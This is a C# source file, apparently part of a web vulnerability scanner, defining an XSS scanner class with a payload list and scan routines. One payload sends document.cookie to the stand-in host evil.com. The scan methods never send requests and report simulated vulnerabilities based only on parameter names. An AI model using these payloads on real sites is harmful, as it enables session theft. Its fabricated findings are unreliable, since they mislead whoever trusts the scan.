using SentinelVulnScan.Models;
using Serilog;

namespace SentinelVulnScan.Scanners;

public class XssScanner : BaseScanner
{
    private readonly List<string> _payloads = new()
    {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
        "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
        "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\"></audio>",
        "<video src=1 href=1 onerror=\"javascript:alert('XSS')\"></video>",
        "<body src=1 href=1 onerror=\"javascript:alert('XSS')\"></body>",
        "<object src=1 href=1 onerror=\"javascript:alert('XSS')\"></object>",
        "<script>alert(document.domain)</script>"
    };
    
    public XssScanner(Core.Configuration config) : base(config)
    {
    }
    
    public override string GetScannerName() => "XssInjection";
    
    protected override string GetRemediationAdvice() => 
        "Implement context-specific output encoding. " +
        "Validate and sanitize all user inputs. " +
        "Use Content-Security-Policy headers. " +
        "Consider using auto-escaping template systems. " +
        "Use frameworks with built-in XSS protection.";
    
    protected override string GetCweId() => "CWE-79";
    
    protected override string GetImpactDescription() => 
        "Cross-Site Scripting (XSS) can lead to theft of sensitive cookies, session hijacking, " +
        "keystroke logging, phishing attacks, and malicious redirects. " +
        "It allows attackers to execute arbitrary JavaScript in victims' browsers.";
    
    public override async Task<List<Vulnerability>> ScanAsync(Target target)
    {
        var vulnerabilities = new List<Vulnerability>();
        
        foreach (var endpoint in target.Endpoints)
        {
            if (endpoint.Method.Equals("GET", StringComparison.OrdinalIgnoreCase))
            {
                await ScanGetParametersAsync(endpoint, vulnerabilities);
            }
            else if (endpoint.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                await ScanPostParametersAsync(endpoint, vulnerabilities);
            }
        }
        
        return vulnerabilities;
    }
    
    private async Task ScanGetParametersAsync(Endpoint endpoint, List<Vulnerability> vulnerabilities)
    {
        var uri = new Uri(endpoint.Url);
        var queryParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
        
        foreach (var key in queryParams.AllKeys)
        {
            if (string.IsNullOrEmpty(key)) continue;
            
            foreach (var payload in _payloads)
            {
                try
                {
                    // Clone the query parameters
                    var modifiedParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
                    modifiedParams[key] = payload;
                    
                    // Build the modified URL
                    var uriBuilder = new UriBuilder(uri)
                    {
                        Query = modifiedParams.ToString() ?? string.Empty
                    };
                    
                    var modifiedUrl = uriBuilder.Uri.ToString();
                    
                    // In a real implementation, this would make an HTTP request to the modified URL
                    // and analyze the response to see if the XSS payload is reflected without encoding
                    
                    // For now, we'll simulate a vulnerability for demonstration
                    if (key == "q" || key == "search" || key == "query" || key == "message" || key == "comment")
                    {
                        var vulnerability = CreateVulnerability(
                            endpoint.Url,
                            "GET",
                            key,
                            payload,
                            $"Simulated response contains unencoded payload: {payload}",
                            SeverityLevel.High);
                        
                        vulnerabilities.Add(vulnerability);
                        Log.Warning("Found XSS vulnerability in parameter {Param} at {Url}", 
                            key, endpoint.Url);
                    }
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "Error testing XSS for parameter {Param} at {Url}",
                        key, endpoint.Url);
                }
                
                // Add a small delay to avoid overwhelming the target
                await Task.Delay(Config.RequestDelay);
            }
        }
    }
    
    private async Task ScanPostParametersAsync(Endpoint endpoint, List<Vulnerability> vulnerabilities)
    {
        foreach (var parameter in endpoint.Parameters)
        {
            foreach (var payload in _payloads)
            {
                try
                {
                    // In a real implementation, this would create a POST request with the payload
                    // and analyze the response to see if the XSS payload is reflected without encoding
                    
                    // For now, we'll simulate a vulnerability for demonstration
                    if (parameter.Name.Contains("comment", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("message", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("content", StringComparison.OrdinalIgnoreCase) ||
                        parameter.Name.Contains("text", StringComparison.OrdinalIgnoreCase))
                    {
                        var vulnerability = CreateVulnerability(
                            endpoint.Url,
                            "POST",
                            parameter.Name,
                            payload,
                            $"Simulated response contains unencoded payload: {payload}",
                            SeverityLevel.High);
                        
                        vulnerabilities.Add(vulnerability);
                        Log.Warning("Found XSS vulnerability in parameter {Param} at {Url}", 
                            parameter.Name, endpoint.Url);
                    }
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "Error testing XSS for parameter {Param} at {Url}",
                        parameter.Name, endpoint.Url);
                }
                
                // Add a small delay to avoid overwhelming the target
                await Task.Delay(Config.RequestDelay);
            }
        }
    }
}
